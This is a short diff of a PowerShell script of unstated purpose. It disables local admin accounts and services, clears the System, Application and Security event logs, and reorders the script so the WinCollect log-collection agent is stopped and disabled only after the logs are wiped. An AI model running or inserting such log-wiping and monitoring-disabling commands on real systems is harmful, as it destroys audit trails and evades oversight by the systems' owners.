@@ -24,13 +24,14 @@ Remove-LocalGroupMember -Group "Administrators" -Member "algo"
 Disable-LocalUser -Name "algo"
 Disable-LocalUser -Name "Administrator"
 
-Stop-Process -Name "WinCollectSvc" -Force -ErrorAction Ignore
-Stop-Process -Name "WinCollect" -Force -ErrorAction Ignore
-Stop-Service -Name "WinCollect" -Force -ErrorAction Ignore
-Set-Service -Name "WinCollect" -StartupType Disabled
 Set-Service -Name "W3SVC" -StartupType Disabled
 Set-Service -Name "SNMP" -StartupType Disabled
 
 Clear-EventLog -LogName System
 Clear-EventLog -LogName Application
 Clear-EventLog -LogName Security
+
+Stop-Process -Name "WinCollectSvc" -Force -ErrorAction Ignore
+Stop-Process -Name "WinCollect" -Force -ErrorAction Ignore
+Stop-Service -Name "WinCollect" -Force -ErrorAction Ignore
+Set-Service -Name "WinCollect" -StartupType Disabled
